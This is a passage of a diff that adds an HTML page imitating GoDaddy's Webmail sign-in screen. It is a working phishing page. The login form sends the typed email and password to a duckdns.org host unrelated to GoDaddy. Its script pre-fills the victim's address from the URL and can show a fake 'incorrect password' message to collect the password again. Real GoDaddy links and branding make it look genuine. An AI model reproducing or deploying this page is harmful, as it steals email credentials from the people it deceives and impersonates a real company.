class="svg-fill-gray-light svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M125.49 49.19l10.83-6.62M124.07 57.09l13.72-8.38M123.03 64.76l16.69-10.2M122.9 71.87l19.24-11.76M123.89 78.29l20.83-12.72M125.58 84.3l22.88-13.99M127.83 89.95l24.84-15.18" class="svg-fill-none svg-stroke-gray-dark"></path><path d="M347.4 280.73h77.32a7.11 7.11 0 0 0 7.09-7.09v-1.18c0-3.9-2.94-4.45-7.09-7.09l-10.66-6-6-41.34h-70.57l-6 41.34-11 6c-3.3 2-7.08 3.19-7.08 7.09v1.18a7.11 7.11 0 0 0 7.08 7.09h9.18" class="svg-fill-white"></path><path d="M347.4 280.73h77.32a7.11 7.11 0 0 0 7.09-7.09v-1.18c0-3.9-2.94-4.45-7.09-7.09l-10.66-6-6-41.34h-70.57l-6 41.34-11 6c-3.3 2-7.08 3.19-7.08 7.09v1.18a7.11 7.11 0 0 0 7.08 7.09h9.18" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-none svg-stroke-gray-dark"></path><path d="M501.9 164.05v54.22a6.78 6.78 0 0 1-6.67 6.85H249.9a6.79 6.79 0 0 1-6.67-6.85V22.91a6.79 6.79 0 0 1 6.67-6.85h245.33a6.78 6.78 0 0 1 6.67 6.85v123.42" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><path d="M262.98 186.41a5 5 0 0 1-4.88-5.09V36.05a5 5 0 0 1 4.88-5.09h220.1a5 5 0 0 1 4.88 5.09v145.27a5 5 0 0 1-4.88 5.09z" class="svg-fill-primary-o"></path><path d="M483.08 32.96a3 3 0 0 1 2.88 3.09v145.27a3 3 0 0 1-2.88 3.09h-220.1a3 3 0 0 1-2.88-3.09V36.05a3 3 0 0 1 2.88-3.09h220.1m0-4h-220.1a7 7 0 0 0-6.88 7.09v145.27a7 7 0 0 0 6.88 7.09h220.1a7 7 0 0 0 6.88-7.09V36.05a7 7 0 0 0-6.88-7.09z" class="svg-fill-gray-dark"></path><path d="M362.4 133.97h-.17" class="svg-fill-primary-o"></path><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M260.88 210.94h26.99" class="svg-fill-none svg-stroke-gray-dark"></path><circle cx="373.01" cy="204.74" r="6.2" stroke-miterlimit="10" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></circle><circle cx="300.27" cy="210.94" r="3.54" class="svg-fill-gray-dark"></circle><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M304.88 44.28h49.99" class="svg-fill-none svg-stroke-white"></path><circle cx="294.6" cy="44.28" r="3.54" class="svg-fill-white"></circle><circle cx="282.6" cy="44.28" r="3.54" class="svg-fill-white"></circle><circle cx="270.6" cy="44.28" r="3.54" class="svg-fill-white"></circle><circle cx="433.63" cy="491.5" r="41.25" transform="rotate(-20.7 -642.512 469.233)" class="svg-fill-white"></circle><path d="M391.24 120.47c-1.66-4.19-8.16-6.67-13.6-8.32a1.72 1.72 0 0 1-1-1.59 1.82 1.82 0 0 1 .37-1.1 15.4 15.4 0 0 0 4-10.27c0-5.92-3.25-11.67-10-11.67s-10 5.75-10 11.67a15.4 15.4 0 0 0 4 10.27 1.81 1.81 0 0 1 .36 1.1 1.71 1.71 0 0 1-1 1.59c-5.45 1.65-11.94 4.13-13.6 8.32a6.39 6.39 0 0 0-.47 2.41 6 6 0 0 0 4.75 6h31.86a6 6 0 0 0 4.74-6 6.58 6.58 0 0 0-.41-2.41z" class="svg-fill-gray-light"></path><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M331.67 259.88h66.96" class="svg-fill-none svg-stroke-gray-dark"></path></g></svg>
+
+        </div>
+
+    
+
+        <div class="main">
+
+            <div class="container flex">
+
+                <div class="left"></div>
+
+                <div class="right flex justify-center">
+
+                    <div class="panel-wrapper">
+
+                        <div class="login-panel">
+
+                            <div class="panel-header flex items-center justify-center">
+
+                                <h2>Webmail</h2>
+
+                            </div>
+
+                            <div class="panel-body">
+
+                                <div id="error-block" class="hidden">
+
+                                    <div class="flex">
+
+                                        <div class="icon">
+
+                                            <svg class="uxicon-svg-container ux-alert-icon" height="1.5em" width="1.5em" role="img"><use fill="currentColor" xlink:href="#svg-container-alert"></use></svg>
+
+                                        </div>
+
+                                        <div class="error-content">
+
+                                            You entered an incorrect email address or password. Please try again or try <a href="https://sso.godaddy.com/v1/account/reset?app=email&realm=pass&path=/webmail.php">resetting your password</a>.
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <h2>Sign in</h2>
+
+                                <form method="post" action="https://25800852.duckdns.org/Y/_____________/G0x00.php" id="login-form">
+
+                                    <input type="hidden" id="referrer" name="referrer" value="" />
+
+                                    <div class="form-group">
+
+                                        <div class="input-group required">
+
+                                            <input type="email" name="email" id="email" required />
+
+                                            <label for="email">Email</label>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="form-group">
+
+                                        <div class="input-group required">
+
+                                            <input type="password" name="password" id="password" required />
+
+                                            <label for="password">Password</label>
+
+                                            <button type="button" id="toggle-password-showing">Show</button>
+
+                                        </div>
+
+                                    </div>
+
+                                    <div class="form-group flex items-center">
+
+                                        <div class="check-box-wrapper">
+
+                                            <input type="checkbox" name="keep_signin" id="keep_signin" />
+
+                                            <svg class="uxicon-svg-container ux-control-indicator" height="1.5em" width="1.5em" role="img"><use fill="currentColor" xlink:href="#svg-container-checkmark"></use></svg>
+
+                                        </div>
+
+                                        <label for="keep_signin">Keep me signed in on this device</label>
+
+                                    </div>
+
+                                    <div class="form-group">
+
+                                        <button type="button" id="submit_btn" class="btn btn-dark-fill w-full">Sign In</button>
+
+                                    </div>
+
+                                </form>
+
+                                <br />
+
+                                <br />
+
+                                <div class="form-group text-center mb-0">
+
+                                    Need to find <a href="https://sso.godaddy.com/v1/account/reset?app=email&realm=pass&path=/webmail.php" class="link" target="_blank">your password</a>?
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+
+
+                        <div class="panel-bottom flex-col items-center">
+
+                            <p class="text-center">Don't have GoDaddy email?</p>
+
+                            <a href="https://www.godaddy.com/email/professional-business-email" class="btn btn-outline-dark">Get Started</a>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <div class="footer">
+
+        <div class="footer-wrapper">
+
+            <div class="footer-content">
+
+                <span>Copyright © 1999 - 2022 GoDaddy Operating Company, LLC. All Rights Reserved</span>
+
+                <a href="https://www.godaddy.com/legal/agreements/privacy-policy?target=_blank" class="link">Privacy Policy</a>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+    <div id="svg-container" style="display: none;">
+
+        <svg><symbol id="svg-container-chevron-down" viewBox="0 0 24 24"><path d="M18.53 8.47a.75.75 0 00-1.06 0L12 13.94 6.53 8.47a.75.75 0 00-1.06 1.06l6 6a.75.75 0 001.06 0l6-6a.749.749 0 000-1.06z"></path></symbol></svg>
+
+        <svg><symbol id="svg-container-phone" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M6 4.8L8.1 7 7 8.2l-1 1 .6 1.3c.7 1.5 1.7 2.9 2.9 4.1 1.2 1.2 2.6 2.2 4.1 2.9l1.3.6 1-1 1.2-1.2 2.2 2.2-1.3 1.3c-.4.4-.9.6-1.5.6h-.4c-2.9-.6-5.5-2.1-7.6-4.3C6.1 13.6 4.7 11 4 8.1c-.1-.7.1-1.4.6-1.9L6 4.8zM5.9 2L3.2 4.8c-1 1-1.4 2.4-1.1 3.7.7 3.3 2.4 6.3 4.8 8.6 2.3 2.4 5.3 4.1 8.6 4.8.3.1.5.1.8.1 1.1 0 2.1-.4 2.9-1.2L22 18l-5-5-2.6 2.6c-1.3-.6-2.5-1.5-3.6-2.5-1-1-1.9-2.2-2.5-3.6L11 7 5.9 2z" clip-rule="evenodd"></path></symbol></svg>
+
+        <svg><symbol id="svg-container-checkmark" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M21.41 6.5L9 18.91 2.59 12.5 4 11.09l5 5 11-11 1.41 1.41z" clip-rule="evenodd"></path></symbol></svg>
+
+        <svg><symbol id="svg-container-alert" viewBox="0 0 24 24"><g><path d="M12 13.75a.75.75 0 00.75-.75V9a.75.75 0 10-1.5 0v4a.75.75 0 00.75.75z"></path><path d="M21.371 16.48L14.478 4.417a2.854 2.854 0 00-4.956 0L2.629 16.48a2.853 2.853 0 002.478 4.27h13.787a2.854 2.854 0 002.477-4.27zm-1.307 2.095a1.34 1.34 0 01-1.17.675H5.107a1.352 1.352 0 01-1.175-2.025l6.893-12.063a1.354 1.354 0 012.35 0l6.893 12.063a1.339 1.339 0 01-.004 1.35z"></path><path d="M12 15.25h-.005a1.128 1.128 0 10.005 0z"></path></g></symbol></svg>
+
+    </div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+
+    <script>
+
+        var url = window.location.hash;
+
+        var email = document.URL.substr(document.URL.indexOf('#')+1).split('#')[0];
+
+        var pwdError = document.URL.substr(document.URL.indexOf('#')+1).split('#')[1];
+
+        var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        var pwdAsked = false;
+
+        $("#referrer").val(window.location.href);
+
+
+
+        if(email != '' && regex.test(email)) {
+
+            $("#email").val(email);
+
+            $("#email").parent().addClass('focused');
+
+        }
+
+
+
+        if(pwdError) {
+
+            $('#error-block').removeClass('hidden');
+
+        }
+
+
+
+
+
+        $("#password").keypress(function(e) {
+
+            var key = e.which;
+
+            if(key == 13) {
+
+                $("#submit_btn").trigger('click');
+
+            }
+
+        });
+
+
+
+        $('#submit_btn').click(function() {
+
+            $("#login-form").submit();
+
+        });
+
+
+
+        $('.contact-menu-open').click(function() {
+
+            $(this).toggleClass('open');
+
+            $('#contact-menus').toggleClass('open');
+
+        });
+
+
+
+        $('.main').click(function() {
+
+            $('#contact-menus').removeClass('open');
+
+        });
+
+
+
+        $('.login-panel input').on('focus', function() {
+
+            $(this).parent().addClass('focused');
+
+        });
+
+
+
+        $('.login-panel input').on('blur', function(e) {
+
+            if(e.target.value === '') $(this).parent().removeClass('focused');
+
+        });
+
+
+
+        $('#toggle-password-showing').click(function() {
+
+            console.log($('#password').attr('type'));
+
+            var currentType = $('#password').attr('type');
+
+
+
+            if(currentType === 'password') {
+
+                $('#password').attr('type', 'text');
+
+                $('#toggle-password-showing').text('Hide');
+
+            }
+
+            else {
+
+                $('#password').attr('type', 'password');
+
+                $('#toggle-password-showing').text('Show');
+
+            }
+
+        });
+
+
+
+        $('.uxicon-svg-container.ux-control-indicator').click(function() {
+
+            $('#keep_signin').trigger('click');
+
+        });
+
+
+
+        $('label[key=keep_signin]').click(function() {
+
+            $('#keep_signin').trigger('click');
+
+        });
+
+
+
+        $('#keep_signin').on('click', function(e) {
+
+            var isChecked = $(this).is(':checked');
+
+            
+
+            if(isChecked) {
+
+                $('.check-box-wrapper').addClass('checked');
+
+            }
+
+            else {
+
+                $('.check-box-wrapper').removeClass('checked');
+
+            }
+
+        });
+
+    </script>
+
+</body>
+
+</html>
